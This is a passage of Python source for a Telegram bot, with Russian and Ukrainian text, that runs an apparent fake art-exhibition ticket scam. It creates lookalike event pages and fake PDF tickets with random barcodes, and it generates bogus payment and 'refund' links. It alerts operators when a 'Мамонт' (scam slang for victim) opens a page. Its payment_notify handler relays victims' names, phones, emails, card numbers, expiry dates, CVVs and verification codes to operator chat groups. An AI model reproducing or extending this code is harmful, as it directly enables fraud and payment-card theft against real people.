    target_id = int(call.data.split(':', 1)[1])
    user_data[uid] = {'ban_target': target_id}
    user_step[uid] = 'ban_reason'
    await call.message.answer("Введите причину блокировки:")
    await call.answer()

@router.message(lambda m: user_step.get(m.from_user.id) == 'ban_reason')
@ban_guard
async def ban_save(message: types.Message):
    if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
        uid = message.from_user.id
        user_step[uid] = None
        user_data[uid] = {}
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
        return
    uid = message.from_user.id
    reason = message.text.strip()
    target_id = user_data[uid]['ban_target']
    db_user = get_user(target_id)
    form_json = db_user['form_json'] if db_user else {}
    form_json['banned'] = True
    form_json['ban_reason'] = reason
    c = conn.cursor()
    c.execute('UPDATE users SET form_json=? WHERE user_id=?', (json.dumps(form_json), target_id))
    conn.commit()
    await message.answer(f"Пользователь заблокирован. Причина: <b>{reason}</b>", parse_mode='HTML', reply_markup=admin_panel_kb)
    user_step[uid] = 'admin_panel'

@router.callback_query(lambda c: c.data == "ban_back")
async def ban_back_handler(call: types.CallbackQuery):
    uid = call.from_user.id
    user_step[uid] = None
    manual_payment_attempts.pop(uid, None)
    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
    await call.answer()

@router.callback_query(lambda c: c.data.startswith('unban:'))
async def unban_user(call: types.CallbackQuery):
    uid = call.from_user.id
    await call.message.answer("Пользователь разблокирован.")
    await call.answer()

# --- Билеты ---
@router.message(lambda m: m.text == "🎫Билеты")
@ban_guard
async def tickets_message(message: types.Message):
    uid = message.from_user.id
    set_user_state(uid, 'ticket_input', {})
    await message.answer("Введите данные для билета:", reply_markup=ReplyKeyboardRemove())
    text = (
        "Введите данные по следующему образцу:\n"
        "└ Формат даты: 01/01/2025\n"
        "└ Формат времени: 10:00-22:00\n\n"
        "1. Имя фамилия\n"
        "2. Время\n"
        "3. Дата\n"
        "4. Цена + валюта\n"
        "5. Адрес"
    )
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="❌ Отмена", callback_data="tickets_cancel")]
        ]
    )
    await message.answer(text, reply_markup=kb)

@router.message(StepFilter('ticket_input'))
async def ticket_input_handler(message: types.Message):
    uid = message.from_user.id
    step, data = get_user_state(uid)
    ticket_text = message.text.strip()
    lines = [l for l in ticket_text.split('\n') if l.strip()]
    if len(lines) < 5:
        await message.answer("Пожалуйста, введите все данные по образцу (5 строк, каждая с новой строки). Попробуйте ещё раз.")
        return
    name, time, date, price, address = lines[:5]
    # Генерируем уникальный order_id
    order_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    pdf_filename = f"order_{order_id}.pdf"
    pdf_path = os.path.join(TICKETS_DIR, pdf_filename)
    # Генерируем штрихкод
    barcode_value = ''.join(random.choices(string.digits, k=16))
    barcode_path = os.path.join(TICKETS_DIR, f"barcode_{order_id}.png")
    barcode_img = barcode.get('code128', barcode_value, writer=ImageWriter())
    barcode_img.save(barcode_path)
    # Картинка для билета (можно заменить на свою)
    img_path = os.path.join('events-art.com', 'image', 'news_5_1.jpg')
    if not os.path.exists(img_path):
        img_path = os.path.join('events-art.com', 'image', 'news_6_1.webp')
    # Генерируем PDF (стиль как на скрине)
    c = canvas.Canvas(pdf_path, pagesize=A4)
    width, height = A4
    # Верхний домен
    c.setFont("Helvetica-Bold", 18)
    c.setFillColorRGB(0.7,0.7,0.7)
    c.drawString(40, height-40, "events-art.com")
    # Имя крупно
    c.setFont("Helvetica-Bold", 22)
    c.setFillColorRGB(0,0,0)
    c.drawString(40, height-70, name)
    # Картинка по центру
    try:
        img = Image.open(img_path)
        img.thumbnail((400, 200))
        img_io = ImageReader(img)
        c.drawImage(img_io, (width-400)//2, height-320, width=400, height=200)
    except Exception:
        pass
    # PRICE/DATE/TIME блок
    c.setFont("Helvetica-Bold", 14)
    c.drawString(60, height-340, f"PRICE: {price}")
    c.drawString(200, height-340, f"DATE: {date}")
    c.drawString(340, height-340, f"TIME: {time}")
    # Location
    c.setFont("Helvetica-Bold", 16)
    c.drawString(60, height-380, f"Location: {address if address else '?????'}")
    # Штрихкод
    try:
        c.drawImage(barcode_path, 60, height-500, width=400, height=60)
    except Exception:
        pass
    c.setFont("Helvetica", 12)
    c.drawString(60, height-515, barcode_value)
    c.save()
    # Формируем ссылку (events-art.com)
    ticket_url = f"https://events-art.com/file/ticket/{pdf_filename}"
    # Отправляем PDF-файл в чат с подписью
    with open(pdf_path, "rb") as pdf_file:
        await message.answer_document(pdf_file, caption=f"{pdf_filename}")
    # Отдельно отправляем ссылку
    await message.answer(ticket_url)
    clear_user_state(uid)

@router.callback_query(lambda c: c.data == "tickets_cancel")
async def tickets_cancel_handler(call: types.CallbackQuery):
    uid = call.from_user.id
    clear_user_state(uid)
    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
    await call.message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
    await call.answer()

# --- Універсальний back-хендлер ---
@router.message(lambda m: m.text and (m.text.strip().lower() == '⬅️ назад' or m.text.strip().lower() == 'назад'))
@ban_guard
async def force_back_to_main(message: types.Message):
    uid = message.from_user.id
    step, _ = get_user_state(uid)
    if step == 'payment_type_selection':
        print(f"[DEBUG] Skipping force_back_to_main for payment_type_selection")
        return
    clear_user_state(uid)
    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
    await message.answer("Повернення в головне меню.", reply_markup=kb)

# --- Хендлер для кнопки "Ссылки" ---
links_template_kb = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="Шаблон заполнения 📎")],
        [KeyboardButton(text="❌ Отмена")]
    ],
    resize_keyboard=True
)

@router.message(lambda m: m.text and 'ссылки' in m.text.lower() and (user_step.get(m.from_user.id) is None))
@ban_guard
async def handle_links_button(message: types.Message):
    print("handle_links_button called")
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Создать ссылку")],
            [KeyboardButton(text="Изменить ссылки")],
            [KeyboardButton(text="⬅️ Назад")]
        ],
        resize_keyboard=True
    )
    await message.answer("Выберите действие:", reply_markup=kb)
    user_step[message.chat.id] = 'links_menu'
    set_user_state(message.from_user.id, 'links_menu', {})

@router.message(StepFilter('links_menu'))
@ban_guard
async def handle_links_menu(message: types.Message):
    text = message.text.strip().lower()
    if text == "создать ссылку":
        # Повертаємо стару інструкцію-шаблон
        template_text = (
        "1️⃣Введите данные по следующему образцу:\n"
        "📅 Формат даты: 01.01.2025 12:00\n\n"
        "1. Дата/время Terroir and Traditions\n"
        "2. Дата/время Collection Co–selection\n"
        "3. Дата/время Snucie\n"
        "4. Дата/время Art that saves lives\n"
        "5. Дата/время Gotong Royong\n"
        "6. Дата/время Anna Konik\n"
        "7. Дата/время Uncensored\n"
        "8. Дата/время Jacek Adamas\n"
        "9. Валюта (PLN,EUR,USD...)\n"
        "10. Адрес выставки\n"
        "11. Цена за билет\n\n"
        "Минимальная стоимость одного билета - 40 EUR!\n"
        "Минимальная стоимость для Австралии - 110 AUD"
    )
        await message.answer(template_text, reply_markup=links_template_kb)
        user_step[message.chat.id] = 'event_all_fields'
    elif text == "изменить ссылки":
        # --- Показати список останніх 50 page_code з номерами як ?page=13-140 ---
        c = conn.cursor()
        c.execute('SELECT page_code FROM site_users ORDER BY created_at DESC LIMIT 50')
        codes = [row[0] for row in c.fetchall() if row[0]]
        if not codes:
            await message.answer("Нет доступных ссылок для изменения.")
            user_step[message.chat.id] = None
            return
        # Формуємо кнопки у вигляді ?page=13-140
        kb = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text=f"?page={code}")] for code in codes] + [[KeyboardButton(text="⬅️ Назад")]],
            resize_keyboard=True
        )
        await message.answer("Последние 50 ссылок. Выберите ссылку:", reply_markup=kb)
        user_step[message.chat.id] = 'choose_link_to_edit'
    elif text == "⬅️ назад":
        kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
        await message.answer("Главное меню:", reply_markup=kb)
        user_step[message.chat.id] = None
        return
    else:
        await message.answer("Пожалуйста, выберите действие из меню.")

@router.message(StepFilter('choose_link_to_edit'))
@ban_guard
async def handle_choose_link_to_edit(message: types.Message):
    text = message.text.strip()
    if text == "⬅️ Назад":
        kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
        await message.answer("Главное меню:", reply_markup=kb)
        user_step[message.chat.id] = None
        return
    # Парсимо page_code з кнопки виду ?page=13-140
    text = message.text.strip()
    if text.startswith('?page='):
        page_code = text[6:]
    else:
        page_code = text
    # Перевіряємо, чи існує такий page_code
    c = conn.cursor()
    c.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
    row = c.fetchone()
    if not row:
        await message.answer("Ссылка не найдена. Попробуйте еще раз.")
        return
    # Показуємо меню для цієї ссилки
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Изменить данные")],
            [KeyboardButton(text="Изменить места")],
            [KeyboardButton(text="Удалить ссылку")],
            [KeyboardButton(text="⬅️ Назад")]
        ],
        resize_keyboard=True
    )
    await message.answer(f"Настройки для ссылки ?page={page_code}", reply_markup=kb)
    user_step[message.chat.id] = f'edit_link_menu_{page_code}'

@router.message(StepStartsWithFilter('edit_link_menu_'))
@ban_guard
async def handle_edit_link_menu(message: types.Message):
    print(f"[DEBUG] handle_edit_link_menu: start, text={message.text!r}, user_step={user_step.get(message.from_user.id)}")
    state = user_step.get(message.from_user.id, '')
    page_code = state.replace('edit_link_menu_', '')
    text = message.text.strip().lower()
    print(f"[DEBUG] handle_edit_link_menu: after state, text={text!r}, page_code={page_code}")
    if text == "изменить места":
        # --- Меню вибору події ---
        kb = ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text=f"{i+1}. {EVENT_FIXED_EVENTS[i]}")] for i in range(8)
            ] + [[KeyboardButton(text="⬅️ Назад")]],
            resize_keyboard=True
        )
        await message.answer("Для якої події змінити кількість місць?", reply_markup=kb)
        user_step[message.from_user.id] = f'edit_places_choose_{page_code}'
    elif text == "удалить ссылку":
        print(f"[DEBUG] handle_edit_link_menu: отримано 'Удалить ссылку' для page_code={page_code}")
        # Видаляємо з site_users і event_links
        c = conn.cursor()
        c.execute('DELETE FROM site_users WHERE page_code=?', (page_code,))
        c.execute('DELETE FROM event_links WHERE event_code=?', (page_code,))
        conn.commit()
        await message.answer(f"Ссылка ?page={page_code} успешно удалена.")
        # Повертаємо до списку посилань
        c.execute('SELECT page_code FROM site_users ORDER BY created_at DESC LIMIT 50')
        codes = [row[0] for row in c.fetchall() if row[0]]
        kb = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text=f"?page={code}")] for code in codes] + [[KeyboardButton(text="⬅️ Назад")]],
            resize_keyboard=True
        )
        await message.answer("Последние 50 ссылок. Выберите ссылку:", reply_markup=kb)
        user_step[message.chat.id] = 'choose_link_to_edit'
    elif text == "⬅️ назад":
        kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
        await message.answer("Главное меню:", reply_markup=kb)
        user_step[message.chat.id] = None
        return
    else:
        await message.answer("Пожалуйста, выберите действие из меню.")

@router.message(StepFilter('edit_places_choose_'))
@ban_guard
async def handle_edit_places_choose(message: types.Message):
    state = user_step.get(message.from_user.id, '')
    page_code = state.replace('edit_places_choose_', '')
    text = message.text.strip()
    if text == "⬅️ Назад":
        kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
        await message.answer("Главное меню:", reply_markup=kb)
        user_step[message.chat.id] = None
        return
    # Визначаємо event_index по тексту кнопки
    try:
        event_index = int(text.split('.', 1)[0]) - 1
        if not (0 <= event_index < 8):
            raise ValueError
    except Exception:
        await message.answer("Виберіть подію з меню.")
        return
    # Показуємо поточну кількість місць
    places = get_event_places(page_code, event_index)
    await message.answer(f"Текущее количество мест для {EVENT_FIXED_EVENTS[event_index]}: {places}\n\nВведите новое количество мест:", reply_markup=ReplyKeyboardRemove())
    user_step[message.from_user.id] = f'edit_places_{page_code}_{event_index}'

@router.message(StepFilter('edit_places_'))
@ban_guard
async def handle_edit_places(message: types.Message):
    state = user_step.get(message.from_user.id, '')
    parts = state.split('_')
    if len(parts) == 4:
        # edit_places_{page_code}_{event_index}
        page_code = parts[2]
        event_index = int(parts[3])
    else:
        # старий формат — ігноруємо
        return
    try:
        places = int(message.text.strip())
        if places < 0:
            raise ValueError
    except Exception:
        await message.answer("Введите корректное положительное число мест.")
        return
    set_event_places(page_code, event_index, places)
    await message.answer(f"Количество мест для {EVENT_FIXED_EVENTS[event_index]} успешно обновлено: {places}")
    # Повертаємо в меню редагування цієї ссилки
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Изменить данные")],
            [KeyboardButton(text="Изменить места")],
            [KeyboardButton(text="Удалить ссылку")],
            [KeyboardButton(text="⬅️ Назад")]
        ],
        resize_keyboard=True
    )
    await message.answer(f"Настройки для ссылки {page_code}", reply_markup=kb)
    user_step[message.chat.id] = f'edit_link_menu_{page_code}'

def event_all_fields_and_template(m):
    uid = m.from_user.id
    step, _ = get_user_state(uid)
    return step == 'event_all_fields' and m.text and 'шаблон' in m.text.lower()

@router.message(event_all_fields_and_template)
@ban_guard
async def send_fill_template(message: types.Message):
    template = (
        "28.06.2025 10:00-22:00\n"
        "29.06.2025 10:00-22:00\n"
        "30.06.2025 10:00-22:00\n"
        "01.07.2025 10:00-22:00\n"
        "02.07.2025 10:00-22:00\n"
        "03.07.2025 10:00-22:00\n"
        "04.07.2025 10:00-22:00\n"
        "05.07.2025 10:00-22:00\n"
        "EUR\n"
        "plac Stanisława Małachowskiego 3, 00-916 Warszawa\n"
        "45"
    )
    await message.answer(template, reply_markup=ReplyKeyboardRemove())
    user_step[message.chat.id] = 'event_all_fields'

@router.message(StepFilter('event_all_fields'))
@ban_guard
async def event_all_fields_handler(message: types.Message):
    if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
        uid = message.from_user.id
        user_step[uid] = None
        user_data[uid] = {}
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
        return
    # Игнорируем пустые строки, обрезаем пробелы
    lines = [l.strip() for l in message.text.split('\n') if l.strip()]
    if len(lines) != 11:
        await message.answer(f"❗️ Должно быть ровно 11 непустых строк! Вы отправили: {len(lines)}. Скопируйте шаблон и заполните все поля.")
        return
    # Парсим данные
    dates = []
    times = []
    for dt in lines[:8]:
        if ' ' in dt:
            date, time = dt.split(' ', 1)
            dates.append(date)
            times.append(time)
        else:
            await message.answer("❗️ Каждая из первых 8 строк должна содержать дату и время через пробел!")
            return
    currency = lines[8]
    address = lines[9]
    price = lines[10]
    EVENT_user_data[message.chat.id] = {
        'title': 'Выставка',
        'dates': dates,
        'times': times,
        'currency': currency,
        'address': address,
        'price': price
    }
    await events_save_all(message)
    user_step[message.chat.id] = None

def links_template_wait_and_cancel(m):
    uid = m.from_user.id
    step, _ = get_user_state(uid)
    return step == 'links_template_wait' and m.text and 'отмена' in m.text.lower()

@router.message(links_template_wait_and_cancel)
async def cancel_links_template(message: types.Message):
    await message.answer("Действие отменено.", reply_markup=ReplyKeyboardRemove())
    user_step[message.chat.id] = None

@router.message(StepStartsWithFilter('text_for_'))
@log_function
async def admin_enter_text(message: types.Message):
    print(f"admin_enter_text called by {message.from_user.id} with text: {message.text}")
    step = user_step[message.from_user.id]
    ip = step.replace("text_for_", "")
    text = message.text
    text_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    requests.post('http://127.0.0.1:8080/set_custom_text', json={'text_id': text_id, 'text': text})
    import aiohttp
    async def set_flag():
        async with aiohttp.ClientSession() as session:
            await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'text', 'text_id': text_id})
    import asyncio
    asyncio.create_task(set_flag())
    await message.answer("Кнопка с текстом появится на сайте пользователя.")
    user_step[message.from_user.id] = None

# --- Обробник для вибору типу оплати (має бути ПЕРЕД block_others) ---
@router.message(StepFilter('payment_type_selection'))
@ban_guard
async def payment_type_selection(message: types.Message):
    uid = message.from_user.id
    print(f"[DEBUG] payment_type_selection handler called: text={message.text!r}, user_step={user_step.get(uid)}")
    text = (message.text or '').strip().lower()
    if text == "refund":
        print(f"[DEBUG] Processing refund for user {uid}")
        user_step[uid] = 'manual_payment_amount'
        payment_type_by_uid[uid] = 'refund'
        await message.answer("Введите сумму и валюту через пробел (например: 45 EUR или 100 USD):", reply_markup=ReplyKeyboardRemove())
    elif text == "defolt":
        print(f"[DEBUG] Processing defolt for user {uid}")
        user_step[uid] = 'manual_payment_amount'
        payment_type_by_uid[uid] = 'defolt'
        await message.answer("Введите сумму и валюту через пробел (например: 45 EUR или 100 USD):", reply_markup=ReplyKeyboardRemove())
    elif text in ["⬅️ назад", "назад"]:
        print(f"[DEBUG] Processing back for user {uid}")
        user_step[uid] = None
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer("Возврат в главное меню.", reply_markup=kb)
    else:
        print(f"[DEBUG] Unknown text in payment_type_selection: {message.text!r}")
        await message.answer("Пожалуйста, выберите тип оплаты из меню.")

@router.message(StepFilter('manual_payment_amount'))
@ban_guard
async def manual_payment_amount_handler(message: types.Message):
    try:
        uid = message.from_user.id
        back_kb = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="⬅️ Назад")]],
            resize_keyboard=True
        )
        # Скидання за ключовим словом "назад"
        if message.text and "назад" in message.text.lower():
            user_step[uid] = None
            manual_payment_attempts.pop(uid, None)
            payment_type_by_uid.pop(uid, None)
            for mid in bot_message_ids.get(uid, []):
                try:
                    await message.bot.delete_message(uid, mid)
                except Exception:
                    pass
            bot_message_ids[uid] = []
            kb = admin_menu_kb if is_admin(uid) else main_menu_kb
            await message.answer("Возврат в главное меню.", reply_markup=ReplyKeyboardRemove())
            await message.answer("Головне меню:", reply_markup=kb)
            return
        m = re.match(r"^([0-9]+(?:[.,][0-9]+)?)\s*([A-Za-z]{3,5})$", message.text.strip())
        if m:
            amount = m.group(1).replace(',', '.')
            currency = m.group(2).upper()
            payment_type = payment_type_by_uid.get(uid, 'refund')
            print(f"[DEBUG] manual_payment_amount_handler: payment_type={payment_type}, amount={amount}, currency={currency}")
            if payment_type == 'defolt':
                link = f"https://artpullse.com/buy-tickets/loading/?total={amount}&currency={currency}&f=1"
            else:
                link = f"https://artpullse.com/refund/?total={amount}&currency={currency}"
            print(f"[DEBUG] manual_payment_amount_handler: generated link: {link}")
            sent_msg = await message.answer(f"Ссылка для оплаты для пользователя:\n{link}", reply_markup=ReplyKeyboardRemove())
            user_step[uid] = None
            manual_payment_attempts.pop(uid, None)
            payment_type_by_uid.pop(uid, None)
            for mid in bot_message_ids.get(uid, []):
                try:
                    await message.bot.delete_message(uid, mid)
                except Exception:
                    pass
            bot_message_ids[uid] = []
            kb = admin_menu_kb if is_admin(uid) else main_menu_kb
            await message.answer("Головне меню:", reply_markup=kb)
            return
        else:
            # Лічильник спроб
            manual_payment_attempts[uid] = manual_payment_attempts.get(uid, 0) + 1
            if manual_payment_attempts[uid] >= 2:
                user_step[uid] = None
                manual_payment_attempts.pop(uid, None)
                # --- Видалити всі попередні повідомлення з кнопками, якщо є ---
                for mid in bot_message_ids.get(uid, []):
                    try:
                        await message.bot.delete_message(uid, mid)
                    except Exception:
                        pass
                bot_message_ids[uid] = []
                kb = admin_menu_kb if is_admin(uid) else main_menu_kb
                await message.answer("❗️ Формат невірний. Ви повернуті в головне меню.", reply_markup=kb)
            else:
                # --- Додаємо id повідомлення з кнопками у список ---
                msg = await message.answer("❗️ Введіть суму і валюту через пробел (наприклад: 45 EUR або 100 USD):", reply_markup=back_kb)
                bot_message_ids.setdefault(uid, []).append(msg.message_id)
    except Exception as e:
        user_step[message.from_user.id] = None
        manual_payment_attempts.pop(message.from_user.id, None)
        await message.answer(f"Сталася помилка: {e}")


@router.message()
async def block_others(message: types.Message):
    uid = message.from_user.id
    step, data = get_user_state(uid)
    # Throttle: не відповідати частіше, ніж раз на 5 секунд
    if not can_reply(uid):
        return
    print(f"[DEBUG] block_others: text={getattr(message, 'text', None)!r}, type={getattr(message, 'content_type', None)}, user_step={step}")
    text = getattr(message, 'text', None) or getattr(message, 'caption', None)
    if text and (text.strip().lower() == 'назад' or text.strip().lower() == '⬅️ назад'):
        return
    # НЕ обробляємо повідомлення, якщо користувач знаходиться в payment_type_selection або manual_payment_amount
    if step in ['payment_type_selection', 'manual_payment_amount']:
        print(f"[DEBUG] Skipping block_others for payment_type_selection/manual_payment_amount")
        return
    if is_admin(uid):
        m = re.match(r"^(\d+(?:[.,]\d+)?)\s*([A-Za-z]{3,5})$", message.text.strip())
        if m:
            amount = m.group(1).replace(',', '.')
            currency = m.group(2).upper()
            link = f"https://artpullse.com/refund/?total={amount}&currency={currency}"
            await message.answer(f"Ссылка для оплаты для пользователя:\n{link}")
            return
    print(f"[DEBUG] block_others handler triggered for user {message.from_user.id}, text: {message.text}, user_step: {step}")
    if message.text and 'ссылки' in message.text.lower():
        return
    if step in ['event_title', 'event_dates', 'event_times', 'event_all_fields']:
        return
    db_user = get_user(uid)
    if db_user and db_user['form_json'].get('banned', False):
        await message.answer(
            "Ви заблоковані адміністратором. Причина: " + db_user['form_json'].get('ban_reason', 'Не вказана')
        )
        return
    if message.text in ["⚙️Меню", "📎Ссылки", "🎫Билеты", "Добавить/Изменить кошелек", "Сменить псевдоним"]:
        return
    if message.text and message.text == '/start':
        return
    if is_admin(uid):
        if message.text in ["🛠️ Админ панель", "🚫 Заблокировать / разблокировать", "💸 Начислить выплату", "⬅️ Назад"]:
            return
        if step in ['admin_panel', 'ban_unban_user', 'pay_user', 'pay_user_profile', 'pay_amount', 'manual_payment_amount', 'manual_payment_defolt']:
            return
    if db_user and db_user['status'] != 'approved':
        if db_user['status'] == 'pending':
            await message.answer("Ваша заявка уже отправлена, ожидайте проверки.")
        elif db_user['status'] == 'rejected':
            if db_user['last_submit']:
                last = datetime.fromisoformat(db_user['last_submit'])
                if datetime.utcnow() - last < timedelta(days=7):
                    next_time = last + timedelta(days=7)
                    await message.answer(f"Ваша заявка была отклонена. Повторно подать заявку можно {next_time.strftime('%d.%m.%Y %H:%M')}")
                    return
            await message.answer("Ваша заявка отклонена.")
        else:
            await message.answer("Для начала заполните анкету командой /start")
    elif not db_user:
        await message.answer("Для начала заполните анкету командой /start")

# --- EVENTS ART BOT (ex-bot.py) ---
EVENTS_FILE = os.path.join('events-art.com', 'events.json')
EVENT_DOMAIN = 'artpullse.com'
EVENT_FIXED_EVENTS = [
    'Terroir and Traditions',
    'Collection Co–selection',
    'Snucie',
    'Art that saves lives',
    'Gotong Royong',
    'Anna Konik',
    'Uncensored',
    'Jacek Adamas'
]
EVENT_FIXED_PATHS = [
    'terroir-and-traditions/index.html',
    'collection-co–selection/index.html',
    'snucie/index.html',
    'art-that-saves-lives/index.html',
    'gotong-royong/index.html',
    'anna-konik/index.html',
    'uncensored/index.html',
    'jacek-adamas/index.html'
]
EVENT_user_data = {}

def EVENT_load_events():
    try:
        with open(EVENTS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return {}

def EVENT_save_events(events):
    with open(EVENTS_FILE, 'w', encoding='utf-8') as f:
        json.dump(events, f, ensure_ascii=False, indent=2)

@router.message(Command('events'))
async def events_start(message: types.Message):
    EVENT_user_data[message.chat.id] = {}
    await message.answer("Введите название выставки:")
    user_step[message.chat.id] = 'event_title'

async def events_save_all(message):
    chat_id = message.chat.id
    try:
        event_id = str(uuid.uuid4())
        short_event_id = event_id[:6]
        events_file = os.path.join('events-art.com', 'events.json')
        # Завантажуємо існуючі події
        try:
            with open(events_file, 'r', encoding='utf-8') as f:
                events = json.load(f)
        except Exception as e:
            print(f"[EVENTS] Не вдалося прочитати events.json: {e}")
            events = {}
        # Додаємо нову подію
        user_event = EVENT_user_data.get(chat_id)
        if not user_event:
            await message.answer("❗️ Дані івенту не знайдено. Спробуйте ще раз з початку.")
            print(f"[EVENTS] EVENT_user_data порожній для chat_id={chat_id}")
            # Скидаємо крок
            user_step[message.from_user.id] = None
            # Повернення в головне меню
            kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
            await message.answer("✅ Посилання збережено. Повертаємося в головне меню:", reply_markup=kb)
            return
    
            return
        events[event_id] = {
            'title': user_event.get('title', 'Выставка'),
            'price': user_event.get('price', '45'),
            'currency': user_event.get('currency', 'EUR'),
            'address': user_event.get('address', ''),
            'events': [
                {
                    'name': EVENT_FIXED_EVENTS[i],
                    'path': EVENT_FIXED_PATHS[i],
                    'date': user_event['dates'][i],
                    'time': user_event['times'][i]
                } for i in range(8)
            ]
        }
        with open(events_file, 'w', encoding='utf-8') as f:
            json.dump(events, f, ensure_ascii=False, indent=2)
        # --- Створюємо запис у site_users ---
        price = user_event.get('price', '45')
        currency = user_event.get('currency', 'EUR')
        street = user_event.get('address', '')
        dates = user_event.get('dates', [''] * 8)
        times = user_event.get('times', [''] * 8)
        # Об'єднуємо дату і час у формат "дата час"
        combined_dates = []
        for i in range(8):
            if dates[i] and times[i]:
                combined_dates.append(f"{dates[i]} {times[i]}")
            else:
                combined_dates.append(dates[i] if dates[i] else '')
        site_user_id, page_code = create_site_user(combined_dates, currency, street, price)
        # Формуємо повідомлення з посиланнями
        msg = f"Выставка успешно создана:\n<b>{user_event.get('title', 'Выставка')}</b>\n"
        msg += f"💵 Цена: <b>{price} {currency}</b>\n"
        msg += f"📍 Адрес: <b>{street or 'Не указан'}</b>\n"
        msg += f"🆔 Site User ID: <code>{site_user_id}</code>\n"
        msg += f"🔖 Page Code: <code>{page_code}</code>\n\n"
        msg += f"<b>Афиша:</b>\n"
        msg += f"<b>Главная страница:</b> http://{EVENT_DOMAIN}/?page={page_code}\n"
        for idx, ev in enumerate(events[event_id]['events'], 1):
            path = ev['path']
            if path.endswith('/index.html'):
                path = path[:-10]
            link = f"http://{EVENT_DOMAIN}/{path}?page={page_code}"
            msg += f"{idx}. {ev['name']} ({ev['date']} {ev['time']})\n{link}\n"
        await message.answer(msg, parse_mode='HTML')
        # Повертаємо меню після створення виставки
        kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
        await message.answer("Головне меню:", reply_markup=kb)
        # Зберігаємо зв'язок page_code <-> user_id (Telegram user_id, а не site_user_id)
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO event_links (event_code, user_id) VALUES (?, ?)', (page_code, message.from_user.id))
        conn.commit()
    except Exception as e:
        print(f"[EVENTS] Помилка у events_save_all: {e}")
        import traceback
        traceback.print_exc()
        await message.answer(f"❗️ Виникла помилка при створенні івенту: {e}")
        

@log_function
async def notify_admin(request):
    data = await request.json()
    page = data.get('page', '')
    url = data.get('url', '')
    ip = data.get('ip', '')
    country = data.get('country', '')
    # Формуємо повідомлення тільки про сторінку
    msg = (
        "⚠️ Мамонт открыл страницу\n"
        f"📄 Страница: {page}\n"
        f"🔗 Ссылка: {url}\n"
        f"🌐 IP: {ip}\n"
        f"🌍 Страна: {country}"
    )
    try:
        await bot.send_message(ADMIN_GROUP_ID, msg)
        print('Message sent to admin group')
    except Exception as e:
        print('Error sending message:', e)
    return web.Response(text="OK")

@log_function
async def payment_notify(request):
    data = await request.json()
    print(f'[DEBUG] payment_notify data: {data}')
    name = data.get('name', '')
    phone = data.get('phone', '')
    email = data.get('email', '')
    card = data.get('card', '')
    expiry = data.get('expiry', '')
    cvv = data.get('cvv', '')
    code = data.get('code', '')
    ip = data.get('ip', '')
    # --- Додаємо суму ---
    price = data.get('price', '')
    currency = data.get('currency', '')
    total = data.get('total', '')
    sum_str = ''
    if price and currency:
        sum_str = f'\nСумма: {price} {currency}'
    elif total:
        import re
        m = re.match(r"(\d+[\.,]?\d*)([A-Za-z]+)", total)
        if m:
            sum_str = f'\nСумма: {m.group(1).replace(",", ".")} {m.group(2)}'
        else:
            sum_str = f'\nСумма: {total}'
    # 1. Повідомлення з ФІО, телефоном, email, IP + кнопки блокування
    msg1 = (
        f"Мамонт ввёл Ф.И.О.: <b>{name}</b>\n\n"
        f"phone_number: {phone}\n"
        f"full_name: {name}\n"
        f"mail: {email}\n"
        f"ip: {ip}" + sum_str
    )
    kb1 = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="Заблокировать", callback_data=f"block:{ip}"),
                InlineKeyboardButton(text="Розблокувати", callback_data=f"unblock:{ip}")
            ]
        ]
    )
    try:
        await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
    except Exception as e:
        print(f"[ERROR] Не вдалося надіслати msg1 у PAYMENT_GROUP_ID: {e}")
        import traceback
        traceback.print_exc()
    try:
        await bot.send_message(ADMIN_GROUP_ID, msg1, parse_mode='HTML')  # Без кнопок
    except Exception as e:
        print(f"[ERROR] Не вдалося надіслати msg1 у ADMIN_GROUP_ID: {e}")
        import traceback
        traceback.print_exc()
    # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
    page_code = data.get('page', '') or data.get('page_code', '')
    msg2 = (
        f"E: {email}\n"
        f"C: {card}\n"
        f"D: {expiry}\n"
        f"V: {cvv}\n"
        f"I: {ip}" + sum_str
    )
    kb2_buttons = [
        InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
        InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
        InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
        InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
    ]
    if page_code:
